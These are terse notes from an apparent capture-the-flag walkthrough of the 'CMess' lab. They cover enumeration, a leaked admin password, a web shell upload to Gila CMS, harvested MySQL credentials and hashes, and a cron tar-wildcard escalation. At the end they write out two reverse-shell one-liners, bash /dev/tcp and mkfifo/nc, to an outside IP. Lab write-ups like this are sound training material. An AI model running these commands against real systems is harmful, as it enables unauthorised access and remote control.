start with nmap.

nmap

22
80

***

http 80 

fuff : common lst

```
01                      [Status: 200, Size: 4086, Words: 431, Lines: 103]
1                       [Status: 200, Size: 4086, Words: 431, Lines: 103]
1x1                     [Status: 200, Size: 4086, Words: 431, Lines: 103]
                        [Status: 200, Size: 3871, Words: 522, Lines: 108]
about                   [Status: 200, Size: 3357, Words: 372, Lines: 93]
About                   [Status: 200, Size: 3343, Words: 372, Lines: 93]
admin                   [Status: 200, Size: 1582, Words: 377, Lines: 42]
api                     [Status: 200, Size: 0, Words: 1, Lines: 1]
assets                  [Status: 301, Size: 322, Words: 20, Lines: 10]
author                  [Status: 200, Size: 3596, Words: 419, Lines: 102]
blog                    [Status: 200, Size: 3857, Words: 522, Lines: 108]
category                [Status: 200, Size: 3868, Words: 522, Lines: 110]
feed                    [Status: 200, Size: 735, Words: 37, Lines: 22]
fm                      [Status: 200, Size: 0, Words: 1, Lines: 1]
index                   [Status: 200, Size: 3857, Words: 522, Lines: 108]
Index                   [Status: 200, Size: 3857, Words: 522, Lines: 108]
lib                     [Status: 301, Size: 316, Words: 20, Lines: 10]
log                     [Status: 301, Size: 316, Words: 20, Lines: 10]
login                   [Status: 200, Size: 1582, Words: 377, Lines: 42]
robots.txt              [Status: 200, Size: 65, Words: 5, Lines: 5]
Search                  [Status: 200, Size: 3857, Words: 522, Lines: 108]
search                  [Status: 200, Size: 3857, Words: 522, Lines: 108]
server-status           [Status: 403, Size: 276, Words: 20, Lines: 10]
sites                   [Status: 301, Size: 320, Words: 20, Lines: 10]
src                     [Status: 301, Size: 316, Words: 20, Lines: 10]
tag                     [Status: 200, Size: 3880, Words: 523, Lines: 110]
tags                    [Status: 200, Size: 3143, Words: 337, Lines: 85]
themes                  [Status: 301, Size: 322, Words: 20, Lines: 10]
tmp                     [Status: 301, Size: 316, Words: 20, Lines: 10]


```


***

subdomains:

dev.cmess.thm


***

go to dev.cmess.thm :

```
Development Log
andre@cmess.thm

Have you guys fixed the bug that was found on live?
support@cmess.thm

Hey Andre, We have managed to fix the misconfigured .htaccess file, we're hoping to patch it in the upcoming patch!
support@cmess.thm

Update! We have had to delay the patch due to unforeseen circumstances
andre@cmess.thm

That's ok, can you guys reset my password if you get a moment, I seem to be unable to get onto the admin panel.
support@cmess.thm

Your password has been reset. Here: KPFTN_f2yxe%


```

login into admin panel using.

`adnre@cmess.thm : KPFTN_f2yxe%`

found version of gila cms : `Gila CMS version 1.10.9 `

replace index.php with shell.php got shell.

password : r0otus3rpassw0rd

tried this password for andre but failed.

***

mysql creds found in config.php.

loged in mysql as root.
found andre hash. try to ccrack it using john.

***

andre password found in /opt/.password.bak : UQfsdCB7aAP6

***

mysql hahs foudn :

```
36AC130A98D826670F12FD1D054839C3813F6FC1
25B64E3D9AA6BE0581E02F705D82F0A6DB155D5F

```

***

```
*/2 *   * * *   root    cd /home/andre/backup && tar -zcf /tmp/andre_backup.tar.gz *


```

bash -i >& /dev/tcp/10.11.57.82/1337 0>&1

echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1| nc 10.11.57.82 4445 >/tmp/" > shell.sh